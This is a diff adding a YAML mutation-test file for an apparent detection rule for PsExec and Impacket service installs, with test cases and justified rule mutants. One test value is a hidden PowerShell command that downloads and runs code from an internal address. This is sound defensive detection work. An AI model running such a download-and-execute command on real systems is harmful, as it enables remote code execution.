@@ -1,0 +1,35 @@
+# yaml-language-server: $schema=../../../../schemas/mutation.schema.json
+mutations:
+- name: psexec_renamed_service
+  description: service name with a suffix still starts with PSEXESVC
+  base: 2
+  set:
+    ServiceName: PSEXESVC-WS01-1234
+  should_match: true
+- name: impacket_expanded_root
+  base: 3
+  set:
+    ImagePath: C:\Windows\QwErTyUi.exe
+  should_match: true
+- name: powershell_service
+  base: 4
+  set:
+    ImagePath: powershell -nop -w hidden -c iex(iwr http://10.0.0.5/s)
+  should_match: true
+- name: nine_letter_binary_is_benign
+  description: Impacket names are exactly 8 letters
+  base: 3
+  set:
+    ImagePath: '%SystemRoot%\aBcDeFgHi.exe'
+    ServiceName: Vendor
+  should_match: false
+accepted_rule_mutants:
+- id: "value:susp_name:ServiceName|startswith:PSEXESVC"
+  reason: >-
+    Equivalent on default PsExec: its %SystemRoot%\PSEXESVC.exe path is eight letters, so
+    susp_random_exe fires as well. The name stays because it is the stable, attributable
+    PsExec indicator; the eight-letter heuristic matching it is a coincidence.
+- id: "value:susp_name:ServiceName|startswith:BTOBTO"
+  reason: >-
+    Equivalent on default Impacket smbexec: its ImagePath always starts with %COMSPEC%, so
+    susp_path fires as well. The name stays as an explicit indicator for triage.
